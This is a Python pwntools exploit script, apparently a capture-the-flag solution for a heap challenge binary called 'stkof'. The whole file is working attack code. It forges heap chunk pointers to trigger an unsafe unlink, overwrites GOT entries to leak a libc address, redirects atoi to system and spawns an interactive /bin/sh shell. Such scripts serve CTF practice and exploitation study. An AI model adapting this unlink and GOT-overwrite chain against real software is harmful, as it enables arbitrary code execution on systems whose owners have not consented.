from pwn import *

r = process('./stkof')

s = lambda x:r.send(str(x))
sl = lambda x:r.sendline(str(x))
c0 = lambda:r.recvuntil('OK')
c1 = lambda:r.recvuntil('FAIL')

def malloc(size):
    sl(1)
    sl(size)
    return c0()

def edit(idx,size,content):
    sl(2)
    sl(idx)
    sl(size)
    s(content)
    return c0()

def free(idx):
    sl(3)
    sl(idx)
    return c0()

def todo(idx):
    sl(4)
    sl(idx)
    return c0()

# create 4 small bin(size 0x80)
malloc(0x80)
malloc(0x80)
malloc(0x80)
malloc(0x80)

# edit 2 and delete 3
# P->fd->bk = P
# P->bk->fd = P
# Overwrite .bss ptr variable.
payload = ''
payload += p64(0)
payload += p64(0)
payload += p64(0x602150-0x18) # heap 2 -> fd
payload += p64(0x602150-0x10) # heap 2 -> bk
payload += (p64(0)*2)*6 # heap 2 -> dummy
payload += p64(0x80) # heap 3 -> prev_size
payload += p64(0x90) # heap 3 -> size + is_used

edit(2,len(payload),payload)
free(3)
log.success('Hi')

# Overwrite .got.plt strlen(0x0000000000602030) -> printf
strlen_gotplt = 0x0000000000602030
fgets_gotplt = 0x602058
atoi_gotplt = 0x0000000000602088
payload = ''
payload += 'A'*8
payload += 'A'*8
payload += p64(strlen_gotplt)
payload += p64(0x602138)
payload += p64(fgets_gotplt)
payload += p64(atoi_gotplt)
edit(2,len(payload),payload)

payload = ''
payload += p64(0x00000000004007A0) # printf
edit(1,len(payload),payload)
libcFgets = u64(todo(3)[1:7]+'\x00\x00')
libcBase = libcFgets - 449232
libcSystem = libcBase + 0x45390

payload = ''
payload += p64(libcSystem)
edit(4,len(payload),payload)
sl('/bin/sh')
r.interactive()